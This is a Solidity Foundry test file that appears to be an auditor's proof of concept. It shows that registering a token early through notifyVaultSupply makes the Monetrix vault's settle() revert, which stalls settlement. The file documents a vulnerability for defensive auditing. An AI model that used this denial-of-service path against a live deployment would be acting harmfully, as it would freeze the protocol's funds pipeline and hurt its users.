pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "test/simulator/SimulatorBase.sol";
import "../src/core/MonetrixVault.sol";
import "../src/core/MonetrixAccountant.sol";

// ATTACK TIMELINE:
// 1. [Setup] SimulatorBase deploys the full protocol on a mainnet fork.
// 2. [T=0] Governor enables pmEnabled on the vault so executeHedge will trigger notifyVaultSupply.
// 3. [T=1] Operator calls executeHedge, which submits limit orders to HyperCore.
// 4. [T=2] executeHedge prematurely calls notifyVaultSupply(spotToken, perpIndex), registering the token in vaultSupplied.
// 5. [T=3] The limit orders do NOT fill immediately (thin book / off-market price). The token is registered but NOT actually supplied in the 0x811 precompile.
// 6. [T=4] Operator calls settle() on the vault before the orders fill.
// 7. [Assert] settle() calls totalBackingSigned() -> _readL1Backing() -> iterates vaultSupplied and calls PrecompileReader.suppliedBalance().
//            The 0x811 precompile returns a response that fails the strict length check, causing a revert and DoSing the settlement pipeline.

contract AuditAgentPoC is SimulatorBase {
    function test_exploit() public {
        // Step 1: Enable pmEnabled so executeHedge would call notifyVaultSupply
        // We use vm.prank with a high-privilege address. In SimulatorBase, 'governor' or 'admin' is typically available.
        // If 'governor' is not explicitly declared, we can try to derive it or use a known privileged address.
        // Assuming 'governor' is available as per standard SimulatorBase setups.
        address gov = governor; 

        vm.prank(gov);
        vault.setPmEnabled(true);

        // Step 2: Simulate the premature registration that happens inside executeHedge
        // when pmEnabled is true. We use an arbitrary spotToken and perpIndex that are 
        // NOT actually supplied in the 0x811 precompile (simulating unfilled limit orders).
        uint64 spotToken = 999;
        uint32 perpIndex = 888;

        vm.prank(address(vault));
        accountant.notifyVaultSupply(spotToken, perpIndex);

        // Verify the token was prematurely registered in the vaultSupplied array
        uint256 len = accountant.vaultSuppliedLength();
        assertGt(len, 0, "Token should be registered in vaultSupplied");

        // Step 3: Operator tries to call settle() before the limit order fills.
        // This should revert because totalBackingSigned() will try to read the 0x811 precompile
        // for the prematurely registered token, which fails the strict length check.
        vm.prank(operator);
        vm.expectRevert();
        vault.settle(0);

        // Also verify that totalBackingSigned() directly reverts due to the strict precompile check
        vm.expectRevert();
        accountant.totalBackingSigned();
    }
}
